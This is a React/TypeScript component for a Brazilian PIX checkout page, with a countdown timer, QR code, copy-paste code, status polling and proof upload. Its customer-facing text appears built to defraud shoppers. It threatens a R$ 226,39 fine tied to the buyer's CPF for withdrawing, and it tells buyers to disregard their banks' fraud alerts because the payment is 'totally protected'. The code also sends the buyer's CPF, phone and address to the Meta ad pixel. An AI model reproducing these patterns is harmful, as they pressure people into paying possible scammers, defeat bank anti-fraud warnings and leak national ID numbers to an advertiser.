import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Copy, Check, Clock, QrCode, RefreshCw, Loader2, AlertTriangle, ChevronDown, ChevronUp } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import ProofUpload from "./ProofUpload";
import BANKS from "./BankLogos";
import { checkPaymentStatus } from "@/lib/checkout-api";
import { useToast } from "@/hooks/use-toast";
import { initMetaPixel, trackPurchase } from "@/lib/meta-pixel";

interface PixPaymentProps {
  pixData: {
    payment_id: string;
    qr_code_base64: string;
    copia_e_cola: string;
    expires_at: string;
    status: string;
  } | null;
  loading: boolean;
  onGeneratePix: () => void;
  email: string;
  cpf: string;
  total?: number;
  fullName?: string;
  phone?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  items?: Array<{ id: string; name: string; qty: number; price: number }>;
}




const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullName, phone, city, state, zipCode, items: orderItems }: PixPaymentProps) => {
  const { toast } = useToast();
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState({ min: "15", sec: "00" });
  const [expired, setExpired] = useState(false);
  const [pixGeneratedAt] = useState(() => Date.now());
  const [status, setStatus] = useState(pixData?.status || "");
  const [checking, setChecking] = useState(false);
  const [showAllBanks, setShowAllBanks] = useState(false);
  const [showQrCode, setShowQrCode] = useState(false);

  useEffect(() => {
    if (!pixData) return;
    // Use expires_at from API only if it's in the future; otherwise fallback to 15 min from now
    const apiExpires = pixData.expires_at ? new Date(pixData.expires_at).getTime() : 0;
    const fallback = pixGeneratedAt + 15 * 60 * 1000;
    const expiresAt = apiExpires > Date.now() ? apiExpires : fallback;

    const timer = setInterval(() => {
      const diff = expiresAt - Date.now();
      if (diff <= 0) {
        setExpired(true);
        setTimeLeft({ min: "00", sec: "00" });
        clearInterval(timer);
      } else {
        const m = Math.floor(diff / 60000);
        const s = Math.floor((diff % 60000) / 1000);
        setTimeLeft({ min: m.toString().padStart(2, "0"), sec: s.toString().padStart(2, "0") });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [pixData, pixGeneratedAt]);

  useEffect(() => {
    if (pixData) setStatus(pixData.status);
  }, [pixData]);

  // Auto-poll payment status every 5 seconds + check on tab focus (mobile)
  useEffect(() => {
    if (!pixData?.payment_id || status === "approved") return;

    console.log("Starting payment polling for:", pixData.payment_id);

    const poll = async () => {
      try {
        const res = await checkPaymentStatus(pixData.payment_id);
        console.log("Poll result:", res.status);
        if (res.status === "approved") {
          setStatus("approved");
          toast({
            title: "✅ Pagamento confirmado!",
            description: "Seu pagamento foi aprovado com sucesso.",
          });
          setTimeout(() => {
            navigate(`/success?order_id=${encodeURIComponent(pixData.payment_id)}`);
          }, 1500);
        }
      } catch (err) {
        console.error("Polling error:", err);
      }
    };

    // Check immediately when user returns to the tab (critical for mobile)
    const handleVisibility = () => {
      if (document.visibilityState === "visible") {
        console.log("Tab became visible, checking payment...");
        poll();
      }
    };

    // Also check on window focus (some browsers use this instead)
    const handleFocus = () => {
      console.log("Window focused, checking payment...");
      poll();
    };

    document.addEventListener("visibilitychange", handleVisibility);
    window.addEventListener("focus", handleFocus);

    // Initial check immediately
    poll();

    const interval = setInterval(poll, 5000);
    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", handleVisibility);
      window.removeEventListener("focus", handleFocus);
    };
  }, [pixData?.payment_id, status, navigate, toast]);

  const handleCopy = useCallback(async () => {
    if (!pixData) return;
    const code = pixData.copia_e_cola || pixData.qr_code_base64;
    await navigator.clipboard.writeText(code);
    setCopied(true);
    toast({
      title: "✅ Código PIX copiado!",
      description: "Agora cole no app do seu banco para finalizar o pagamento.",
    });
    setTimeout(() => setCopied(false), 2500);
  }, [pixData]);

  const handleCheckStatus = useCallback(async () => {
    if (!pixData) return;
    setChecking(true);
    const res = await checkPaymentStatus(pixData.payment_id);
    setStatus(res.status);
    setChecking(false);
  }, [pixData]);

  const handleProofUploaded = useCallback(() => {
    if (!pixData || !orderItems?.length) return;
    initMetaPixel();
    trackPurchase({
      content_ids: orderItems.map((i) => i.id),
      contents: orderItems.map((i) => ({ id: i.id, quantity: i.qty, item_price: i.price })),
      content_type: "product",
      currency: "BRL",
      num_items: orderItems.reduce((s, i) => s + i.qty, 0),
      value: total || 0,
      email,
      phone,
      cpf,
      first_name: fullName,
      city,
      state,
      zip_code: zipCode,
      order_id: pixData.payment_id,
      payment_method: "pix",
    });
  }, [pixData, orderItems, total, email, phone, cpf, fullName, city, state, zipCode]);

  // Pre-generation state
  if (!pixData) {
    return (
      <div className="space-y-4">
        <div className="rounded-xl border border-dashed border-border bg-checkout-highlight p-6 text-center">
          <QrCode className="mx-auto mb-3 h-12 w-12 text-primary opacity-40" />
          <p className="mb-1 text-sm font-medium text-foreground">
            Pague instantaneamente com PIX
          </p>
          <p className="mb-4 text-xs text-muted-foreground">
            O QR Code será gerado após confirmar seus dados
          </p>
          <div className="space-y-2 text-left text-xs text-muted-foreground">
            <p><strong>1.</strong> Clique em "Gerar PIX"</p>
            <p><strong>2.</strong> Copie o código ou escaneie o QR Code</p>
            <p><strong>3.</strong> Pague no app do seu banco</p>
          </div>
        </div>
        <Button
          onClick={onGeneratePix}
          disabled={loading}
          className="w-full bg-accent text-accent-foreground hover:bg-accent/90 h-12 text-base font-semibold"
        >
          {loading ? (
            <span className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 animate-spin" />
              Gerando PIX...
            </span>
          ) : (
            "Gerar PIX"
          )}
        </Button>
      </div>
    );
  }

  const pixCode = pixData.copia_e_cola || pixData.qr_code_base64;
  const formattedTotal = total ? `R$ ${total.toFixed(2).replace(".", ",")}` : "";

  return (
    <div className="space-y-4 sm:space-y-5">
      {/* Aviso comprovante */}
      <div className="rounded-lg bg-primary px-4 py-3 text-center">
        <p className="text-xs sm:text-sm font-medium text-primary-foreground">
          ⚠️ Se o pagamento não confirmar em <strong>30 segundos</strong> após efetuar, por favor envie o comprovante na opção abaixo.
        </p>
      </div>

      {/* Aviso de cancelamento / multa */}
      <div className="rounded-lg border-2 border-destructive bg-destructive/10 px-4 py-3">
        <p className="text-xs sm:text-sm text-foreground leading-relaxed">
          <strong className="text-destructive">⚠️ Atenção:</strong> Este pagamento só pode ser realizado dentro do tempo. Após este período, caso o pagamento não seja confirmado,{" "}
          <strong>sua solicitação será cancelada</strong>. A desistência gera{" "}
          <strong className="text-destructive">multa de R$ 226,39 vinculada ao seu CPF</strong>, conforme os Termos de Uso.
        </p>
      </div>

      {/* Header */}
      <div className="text-center">
        <h3 className="text-lg sm:text-xl font-bold text-foreground">Já é quase seu...</h3>
        <p className="mt-1 text-xs sm:text-sm text-muted-foreground">
          Pague seu pix dentro de{" "}
          <span className={`inline-flex items-center gap-0.5 rounded px-1.5 py-0.5 text-xs font-bold text-primary-foreground ${expired ? "bg-destructive" : "bg-primary"}`}>
            {timeLeft.min}:{timeLeft.sec}
          </span>
          {" "}para garantir sua compra.
        </p>
      </div>

      {/* Total */}
      {formattedTotal && (
        <div className="flex items-center justify-between rounded-lg border border-border bg-card px-4 py-3">
          <span className="text-sm text-muted-foreground">Total do pedido:</span>
          <span className="text-lg font-bold text-foreground">{formattedTotal}</span>
        </div>
      )}

      {/* Beneficiary notice */}
      <div className="rounded-lg border border-border bg-muted/50 px-4 py-3">
        <p className="text-xs text-muted-foreground">
          O beneficiário do PIX é <strong className="text-foreground">KXPAY PAGAMENTOS LTDA</strong>, a empresa que gerencia nossos pagamentos de forma segura.
        </p>
      </div>

      {/* QR Code (collapsible) */}
      <div>
        <button
          onClick={() => setShowQrCode(!showQrCode)}
          className="flex w-full items-center justify-between rounded-lg border border-border bg-card px-4 py-3 text-left transition-colors hover:bg-muted/50"
        >
          <div className="flex items-center gap-2">
            <QrCode className="h-4 w-4 text-primary" />
            <span className="text-sm font-medium text-foreground">
              {showQrCode ? "Ocultar QR Code" : "Mostrar QR Code"}
            </span>
          </div>
          {showQrCode ? <ChevronUp className="h-4 w-4 text-muted-foreground" /> : <ChevronDown className="h-4 w-4 text-muted-foreground" />}
        </button>
        {showQrCode && (
          <div className="mt-3 flex flex-col items-center gap-2">
            <div className="rounded-xl border border-border p-3 bg-card">
              {pixCode ? (
                <QRCodeSVG
                  value={pixCode}
                  size={200}
                  level="M"
                  includeMargin
                />
              ) : (
                <div className="flex h-[200px] w-[200px] items-center justify-center">
                  <QrCode className="h-20 w-20 text-muted-foreground/30" />
                </div>
              )}
            </div>
            <p className="text-xs text-muted-foreground">Aponte a câmera do seu celular</p>
          </div>
        )}
      </div>

      {/* PIX Code + Copy */}
      <div>
        <p className="mb-2 text-sm font-semibold text-foreground">Código PIX</p>
        <div className="flex items-center gap-2 rounded-lg border border-border bg-card px-3 py-2.5">
          <p className="flex-1 truncate text-xs text-muted-foreground font-mono select-all">
            {pixCode}
          </p>
          <Button
            variant="default"
            size="sm"
            onClick={handleCopy}
            className="shrink-0 gap-1.5 bg-primary text-primary-foreground hover:bg-primary/90"
          >
            {copied ? (
              <>
                <Check className="h-3.5 w-3.5" />
                Copiado!
              </>
            ) : (
              <>
                <Copy className="h-3.5 w-3.5" />
                Copiar
              </>
            )}
          </Button>
        </div>
      </div>

      {/* Security Warning */}
      <div className="rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
        <div className="flex items-start gap-3">
          <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
            <AlertTriangle className="h-4 w-4 text-primary-foreground" />
          </div>
          <div>
            <p className="text-sm font-semibold text-foreground">Atenção ao pagar</p>
            <p className="mt-1 text-xs text-muted-foreground">
              Os bancos reforçaram a segurança do Pix e podem exibir alertas preventivos durante o pagamento.{" "}
              <strong className="text-foreground">Fique tranquilo — sua transação é segura e está totalmente protegida.</strong>
            </p>
          </div>
        </div>
      </div>

      <div>
        <p className="mb-3 text-sm font-semibold text-foreground">Como pagar o pix:</p>
        <div className="space-y-3">
          {[
            "Clique em copiar o código PIX logo acima",
            "Acesse o app do seu banco",
            "Vá até a opção PIX",
            'Escolha a opção "COPIA E COLA"',
            "Insira o código copiado e finalize seu pagamento",
          ].map((text, i) => (
            <div key={i} className="flex items-start gap-3">
              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary text-xs font-bold text-primary-foreground">
                {i + 1}
              </span>
              <p className="text-sm text-foreground">{text}</p>
            </div>
          ))}
        </div>
      </div>




      {/* Upload Comprovante */}
      <ProofUpload paymentId={pixData.payment_id} email={email} cpf={cpf} onUploadSuccess={handleProofUploaded} />

      {/* Bank logos */}
      <div>
        <p className="mb-3 text-sm font-semibold text-foreground">Pague com seu banco:</p>
        <div className="space-y-2">
          {BANKS.slice(0, showAllBanks ? BANKS.length : 4).map((bank) => (
            <button
              key={bank.name}
              onClick={handleCopy}
              className="flex w-full items-center gap-3 rounded-lg border border-border bg-card px-4 py-3 text-left transition-colors hover:bg-muted/50 active:bg-muted"
            >
              <img
                src={bank.logo}
                alt={bank.name}
                className="h-8 w-auto max-w-[80px] shrink-0 object-contain"
              />
              <div className="flex-1">
                <p className="text-sm font-medium text-foreground">{bank.name}</p>
                <p className="text-[10px] text-muted-foreground">Pode precisar colar manualmente</p>
              </div>
              <Copy className="h-4 w-4 text-muted-foreground" />
            </button>
          ))}
        </div>
        <button
          onClick={() => setShowAllBanks(!showAllBanks)}
          className="mt-2 flex w-full items-center justify-center gap-1 text-xs font-medium text-primary hover:underline"
        >
          {showAllBanks ? (
            <>Ver menos <ChevronUp className="h-3 w-3" /></>
          ) : (
            <>Ver todos os bancos <ChevronDown className="h-3 w-3" /></>
          )}
        </button>
      </div>

      {/* Status footer */}
      <div className="flex items-center justify-center gap-2 rounded-lg border border-border bg-muted/50 px-4 py-3">
        <Loader2 className="h-4 w-4 animate-spin text-primary" />
        <span className="text-sm text-muted-foreground">Aguardando pagamento...</span>
      </div>
    </div>
  );
};

export default PixPayment;
